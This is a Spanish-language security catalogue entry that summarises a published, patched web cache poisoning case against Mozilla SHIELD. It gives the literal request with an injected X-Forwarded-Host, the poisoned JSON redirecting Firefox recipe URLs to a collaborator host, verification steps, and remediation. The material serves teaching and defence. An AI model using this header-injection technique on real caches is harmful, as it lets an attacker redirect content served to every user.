---
clase: otra
tech: firefox-shield
cwe: CWE-444
cvss: 9.3 # [derivado] recompensa $1,000 segun la fuente; estimado por control de codigo ejecutado en el navegador
payload: |
  # ADVERTENCIA (H1): el render de la fuente colapsa los saltos de linea; las corridas
  # de espacios marcan donde estaban. Estructura reconstruida desde la sintaxis HTTP.
  #
  # Peticion que FIREFOX hace de forma legitima (lo que el atacante quiere redirigir):
  GET /api/v1/recipe/signed/ HTTP/1.1
  Host: xyz.burpcollaborator.net
  User-Agent: Mozilla/5.0 … Firefox/57.0
  Accept: application/json
  origin: null
  X-Forwarded-Host: xyz.burpcollaborator.net
  #
  # EL ENVENENAMIENTO - LITERAL de la fuente:
  GET /api/v1/ HTTP/1.1
  Host: normandy.cdn.mozilla.net
  X-Forwarded-Host: xyz.burpcollaborator.net
  #
  # Respuesta envenenada (cacheada), LITERAL de la fuente:
  #   HTTP/1.1 200 OK
  #   {
  #     "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  #     "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  #     "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  #     "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
  #     …
  #   }
  #
  # El '…' es de la propia fuente.
  #
  # Cuerpo de una 'recipe' real, LITERAL de la fuente (muestra que son instrucciones
  # ejecutables que Firefox obedece):
  #   [{ "id": 403, "name": "Looking Glass (take 2)", "action": "opt-out-study",
  #      "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  #      "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
  #      "description": "MY REALITY IS JUST DIFFERENT THAN YOURS" }]
precondicion: "El endpoint normandy.cdn.mozilla.net reflejaba X-Forwarded-Host en el JSON que lista las URLs del servicio, y esa respuesta era cacheable. X-Forwarded-Host NO formaba parte de la clave de cache (input 'unkeyed'), asi que la respuesta envenenada se servia a todos los usuarios posteriores."
como_se_descubre: |
  Metodologia LITERAL de la fuente: 'The first step is to identify unkeyed inputs.
  Doing this manually is tedious so I've developed an open source Burp Suite extension
  called Param Miner that automates this step by guessing header/cookie names, and
  observing whether they have an effect on the application's response.'
  Y la advertencia que decide si la sonda funciona: 'Cached responses can mask unkeyed
  inputs, so if you're trying to manually detect or explore unkeyed inputs, a
  cache-buster is crucial.' Param Miner añade el valor '$randomplz' a la query para
  garantizar una clave unica por peticion.
control_negativo: |
  # [derivado] diseño de test A/B, con la precaucion que la propia fuente practica
  # A: GET /api/v1/?cb=1 con X-Forwarded-Host: canary
  #    -> el JSON refleja 'canary' = la cabecera influye en la respuesta
  # B: GET /api/v1/?cb=1 SIN la cabecera
  #    -> JSON normal
  # C: GET /api/v1/?cb=1 SIN la cabecera, DESPUES de A
  #    -> si devuelve 'canary', la respuesta quedo cacheada: la cabecera es UNKEYED
  # El paso C es el que distingue 'reflejo de cabecera' (bajo impacto) de
  # 'envenenamiento de cache' (critico). Y el cache-buster distinto por prueba es lo
  # que evita envenenar a usuarios reales durante la verificacion: la fuente usa
  # literalmente 'dontpoisoneveryone=1' para esto.
mata: |
  - X-Forwarded-Host forma parte de la clave de cache -> cada valor tiene su entrada;
    no hay victima.
  - El borde elimina (strip) la cabecera antes de reenviarla.
  - La respuesta no es cacheable (Cache-Control: no-store / private).
  - El paso C no reproduce el valor inyectado -> hay reflejo pero no envenenamiento.
fuente: "https://portswigger.net/research/practical-web-cache-poisoning (James Kettle, publicado 2018-08-09, act. 2025-09-03). Peticiones, respuesta JSON y cuerpo de recipe literales. La fuente indica: parcheado en menos de 24 horas y recompensa de $1,000. Sin CVE indicado."
confianza: media
fecha: 2026-11-02
---
# [CACHÉ] Envenenamiento de `X-Forwarded-Host` en Mozilla SHIELD — dirigir las instrucciones que ejecuta Firefox

## Principio
Un input *unkeyed* es una cabecera que **influye en la respuesta** pero **no forma parte
de la clave de caché**. Esa combinación es toda la vulnerabilidad: el atacante controla
el contenido de una entrada de caché que después se sirve a todos los demás.

Lo que hace a este caso el más grave del paper no es la técnica, que es la básica, sino
**qué** estaba cacheado: el JSON que le dice a Firefox de dónde descargar sus "recipes",
que son instrucciones que el navegador obedece.

## Payload
```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net
```

La respuesta envenenada que queda en caché:

```json
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
  …
}
```

Y después Firefox pide sus recipes al host del atacante.

## Por qué el impacto es tan alto
Una "recipe" no es un dato: es una instrucción con una URL de extensión. El cuerpo real
que muestra la fuente lo deja claro:

```json
[{ "id": 403, "name": "Looking Glass (take 2)", "action": "opt-out-study",
   "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
   "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
   "description": "MY REALITY IS JUST DIFFERENT THAN YOURS" }]
```

Controlar el servidor de recipes es controlar qué se instala en el navegador, en qué
países y en qué versiones. Mozilla lo parcheó en **menos de 24 horas**; la recompensa
fue de $1.000 — una cifra que, frente al alcance, dice más sobre los programas de
recompensas que sobre el fallo.

## El control que distingue reflejo de envenenamiento
Hay que pedir el recurso **sin** la cabecera, después de haberla enviado, y comprobar
que el valor inyectado sigue ahí. Eso es lo que separa "la aplicación refleja una
cabecera" (bajo impacto) de "la caché sirve mi contenido a todos" (crítico). Son dos
hallazgos con órdenes de magnitud de diferencia y el paso cuesta una petición.

## Precaución operativa que la fuente practica
Durante la verificación hay que usar un **cache-buster distinto por prueba**, porque si
no se envenena a usuarios reales mientras se investiga. La fuente usa literalmente
`dontpoisoneveryone=1` como parámetro. Param Miner mantiene un buster de valor fijo
precisamente para que el investigador pueda observar el comportamiento de caché sin
afectar a terceros.

Esto no es un detalle de cortesía: envenenar la caché de producción de un objetivo
durante una prueba es causar el impacto en lugar de demostrarlo, y excede el permiso de
cualquier programa.

## Remediación
Citas literales de la fuente: *"The most robust defense against cache poisoning is to
disable caching."* Y: *"Once you've identified unkeyed inputs in your application, the
ideal solution is to outright disable them. Failing that, you could strip the inputs at
the cache layer, or add them to the cache key."*

Más la conclusión que conecta esta clase con el resto del catálogo:
*"client-side vulnerabilities like XSS in HTTP headers should never be ignored"* — porque
la caché convierte un reflejo inofensivo en un ataque contra todos los usuarios.
